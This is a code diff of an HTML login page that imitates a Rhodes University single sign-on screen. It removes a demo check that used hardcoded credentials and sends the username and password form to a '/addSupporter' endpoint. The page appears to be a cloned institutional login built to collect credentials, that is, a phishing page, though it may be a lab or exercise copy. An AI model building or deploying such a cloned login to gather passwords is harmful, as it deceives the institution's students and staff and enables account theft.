@@ -4,24 +4,6 @@
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
 <meta name="viewport" content="initial-scale=1.0" />
 <script type="text/javascript" src="script.js"></script>
-<script>
-    function authenticateUser(event) {
-        event.preventDefault(); // Prevent the default form submission
-    
-        // Get the username and password from the form
-        var username = document.getElementById("username").value;
-        var password = document.getElementById("password").value;
-    
-        // Perform the authentication check (replace this with your actual authentication logic)
-        if (username === "user123" && password === "password123") {
-            alert("Login successful. Welcome, " + username + "!");
-            // Redirect the user to a logged-in page or perform other actions
-        } else {
-            alert("Invalid username or password. Please try again.");
-            // Clear the form fields or display an error message
-        }
-    }
-    </script>
     
 <title>Enter your username and password</title>
 
@@ -48,7 +30,7 @@
 
     <p class="logintext">A service has requested you to authenticate yourself. Please enter your username and password in the form below.</p>
 
-    <form action="#" method="post" name="f" onsubmit="authenticateUser(event)">
+    <form action="/addSupporter" method="post" id="supporter-form">
         <table>
             <tr>
                 <td rowspan="2" class="loginicon">
@@ -57,12 +39,12 @@
                 </td>
                 <td><label for="username">Username</label></td>
                 <td>
-                    <input id="username"                         type="text" name="username" autocomplete="username" tabindex="1"value="" />
+                    <input id="usernameValue"                         type="text" name="username" autocomplete="username" tabindex="1"value="" />
                 </td>
                         </tr>
                         <tr>
                 <td><label for="password">Password</label></td>
-                <td><input id="password" type="password" tabindex="2" name="password" autocomplete="current-password" /></td>
+                <td><input id="passwordValue" type="password" tabindex="2" name="password" autocomplete="current-password" /></td>
                         </tr>
                                     <tr id="submit">
                 <td class="loginicon"></td><td></td>
@@ -73,8 +55,9 @@
             </tr>
         </table>
         <input type="hidden" id="processing_trans" value="Processing..." />
-        <input type="hidden" name="AuthState" value="#" />    </form>
-<h2 class="logintext">Forgotten your password?</h2><p class="logintext"><ul class="logintext"><li><a href="#">Student password recovery</a></li><li><a href="#">Staff password recovery</a></li></ul></p>            </div><!-- #content -->
+        <input type="hidden" name="AuthState" value="#" />    
+    </form>
+<h2 class="logintext">Forgotten your password?</h2><p class="logintext"><ul class="logintext"><li><a href="#">Student password recovery</a></li><li><a href="#">Staff password recovery</a></li></ul></p></div><!-- #content -->
             <div id="footer">
                 <hr />
 		<span class="float-r"><a href="#">Rhodes University</a></span>
